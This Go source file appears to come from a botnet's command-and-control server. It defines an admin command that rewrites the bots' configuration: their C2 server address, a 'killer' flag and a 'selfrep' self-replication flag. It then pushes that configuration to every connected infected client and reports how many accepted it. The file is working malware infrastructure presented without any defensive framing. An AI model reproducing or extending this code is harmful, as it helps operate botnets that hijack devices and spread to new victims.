package admin

import (
	"fmt"
	"server/core/config"
	"server/core/master/command"
	"server/core/master/session/sessions"
	"server/core/slaves/commands"
	"server/core/slaves/slave"
	"strconv"
	"strings"
)

func init() {
	command.Make(&command.Command{
		Aliases: []string{"config", "synchronize"},
		Executor: func(args []string, session *sessions.Session) {
			if len(args) > 0 {
				for index := range args {
					flagSplit := strings.SplitN(args[index], "=", 2)
					if flagSplit[1][0] == '"' {
						flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
					}

					if len(flagSplit) != 2 {
						session.Println("\x1b[91minvalid key=value combination")
						return
					}

					if flagSplit[0] == "cnc" {
						config.Slave.ServerAddress = flagSplit[1]
					}

					if flagSplit[0] == "killer" {
						killer, err := strconv.ParseBool(flagSplit[1])
						if err != nil {
							return
						}

						config.Slave.Killer = killer
						fmt.Println(killer)
					}

					if flagSplit[0] == "selfrep" {
						selfrep, err := strconv.ParseBool(flagSplit[1])
						if err != nil {
							return
						}
						fmt.Println(selfrep)

						config.Slave.Selfrep = selfrep
						fmt.Println(config.Slave.Selfrep)
					}

				}
			}

			var synchronized = 0
			for _, s := range slave.List.Slaves {

				err := commands.Execute(2, s)
				if err != nil {
					session.Println("\x1b[91mfailed to synchronize config: ", err)
					continue
				}

				buffer, err := s.Connection.Read(1024)

				if err != nil {
					continue
				}

				if buffer[0] != 1 {
					continue
				}

				synchronized++
			}

			session.Println(fmt.Sprintf("%d/%d clients have accepted the synchronize request", synchronized, slave.Count()))
		},
	})
}
